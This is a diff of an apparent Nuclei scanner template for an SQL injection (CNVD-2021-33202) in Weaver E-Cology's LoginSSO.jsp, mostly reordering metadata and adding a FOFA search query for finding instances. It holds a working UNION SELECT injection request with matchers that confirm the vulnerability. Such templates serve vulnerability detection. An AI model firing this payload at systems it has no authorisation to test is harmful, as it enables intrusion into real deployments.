@@ -1,5 +1,4 @@
 id: CNVD-2021-33202
-
 info:
   name: OA E-Cology LoginSSO.jsp - SQL Injection
   author: SleepingBag945
@@ -12,28 +11,26 @@ info:
   classification:
     cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: app="泛微-协同办公OA"
     max-request: 1
+    product: e-cology
     vendor: weaver
-  tags: cnvd2021,cnvd,e-cology,sqli,vuln
-
+    verified: true
+  tags: cnvd,cnvd2021,e-cology,sqli,vuln
 variables:
   num: "999999999"
-
 http:
   - raw:
       - |
         GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20md5({{num}})%20as%20id%20from%20HrmResourceManager HTTP/1.1
         Host: {{Hostname}}
-
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
           - '{{md5(num)}}'
-
       - type: status
         status:
           - 200
-
+        # digest: 490a0046304402204a6d45697b9fa7ff12d41140e9f98eb1801f08e646f6d211b004fc5bcd65679702203c5ffcfc7cfc45ce35dadaaf2284075cc4747795f4952b8c37ade6770b1b2e48:922c64590222798bb761d5b6d8e72950
